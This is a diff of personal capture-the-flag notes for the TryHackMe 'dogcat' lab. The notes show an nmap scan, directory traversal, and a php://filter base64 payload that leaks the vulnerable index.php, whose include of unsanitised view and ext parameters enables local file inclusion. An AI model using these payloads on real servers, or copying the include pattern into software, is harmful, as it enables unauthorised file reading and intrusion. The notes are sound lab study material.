@@ -8,17 +8,15 @@ https://tryhackme.com/hacktivities/search
  
 https://tryhackme.com/room/dogcat
  
- 
-  
-	walkthrough video (John Hammond)
+          walkthrough video (John Hammond)
                        ==============
 https://www.youtube.com/watch?v=u_uuk7FWWF4&list=PL1H1sBF1VAKUOm3WyiZ-m2Oqwku4Xp6if&index=6
    
-export IP= 10.10.5.110
+export IP=10.10.87.80 
 ping $IP
  
   
----------------    nmap      -------------------
+---------------    nmap      -------------------  Network Scanning
 nmap -sC -sV -oN  map.txt $IP
 
 PORT   STATE SERVICE VERSION
@@ -57,7 +55,76 @@ accessing /cats is forbidden — but using the format we found in the source cod
 
  /cats/4.jpg gives us access. This could be crucial for if we find a way to upload a file.
 
+lets try http://$IP/?view=dogs
+ output:
+  Warning: include(dogs.php): failed to open stream: No such file or directory in /var/www/html/index.php on line 24
 
+ Warning: include(): Failed opening 'dogs.php' for inclusion (include_path='.:/usr/local/lib/php') in /var/www/html/index.php on 
+
+    We gain following info:
+-------------
+       We are currently in the /var/www/html/ directory.
+       We are currently accessing index.php and trying to include another file.
+       It appends .php to the parameter value: dogs => dogs.php.
+
+Appending .php means we are limited to read PHP files.
+  The only PHP files we sure exist are index.php, dog.php, and cat.php.
+  Reading index.php will be useful because we can understand the PHP code used behind the scenes.
+
+
+we can assume when we searching ?view=dog ,a file dog.php is executing to send random dogs pictures
+ to the client
+
+At this point, I considered attempting to include index.php itself:
+
+http://dogcat.thm/?view=dog/../../../../index
+
+But since PHP files are executed on the server side, their source code isn’t displayed in the browser.
+ Instead, the server simply runs the code and returns the output so including a PHP file like index.php won’t reveal its contents directly.
+
+
+
+To bypass the issue of PHP files being executed instead of displayed, we can use a clever trick involving PHP stream wrappers. PHP provides special wrappers that alter how files are read. One such wrapper is:
+                   php://filter
+
+
+This allows us to apply filters to a file’s content before it’s processed. 
+By using the convert.base64 encode filter, we can encode the raw source code of a file in Base64 effectively allowing us to view the code instead of executing it.
+
+For example, to read the contents of index.php, we could use the following payload:
+
+?view=php://filter/read=convert.base64-encode/resource=index
+
+However, due to the restriction that only allows dog or cat as input, we need to include a valid directory prefix in the path. So, I modified the payload as follows:
+
+?view=php://filter/read=convert.base64-encode/resource=dog/../../../../../var/www/html/index
+
+This successfully returned the Base64 encoded source of index.php, which can then be decoded to reveal the PHP code running on the server.
+
+openthe page source and copied only the encoded string   
+run :  echo  $STR | base64 -d
+output 
+the page part of the source code is :
+ <?php
+            function containsStr($str, $substr) {
+                return strpos($str, $substr) !== false;
+            }
+	    $ext = isset($_GET["ext"]) ? $_GET["ext"] : '.php'; // add  the .php extension 
+            if(isset($_GET['view'])) {
+                if(containsStr($_GET['view'], 'dog') || containsStr($_GET['view'], 'cat')) {
+                    echo 'Here you go!';
+                    include $_GET['view'] . $ext;
+                } else {
+                    echo 'Sorry, only dogs or cats are allowed.';
+                }
+            }
+        ?>
+
+
+The code checks if the view parameter contains "dog" or "cat" and includes the corresponding file. Additionally, the script allows clients to specify a custom file extension via the ext parameter. If the ext parameter is not provided, the script defaults to appending .php to the included file. This introduces the possibility of including files with different extensions, making it a potential attack vector for exploiting Local File Inclusion (LFI) vulnerabilities.
+
+LFI = Local File Includes 
+https://apt2002.medium.com/tryhackme-dogcat-ctf-detailed-walkthrough-cd746fd232ef
 
  Question Hint
 
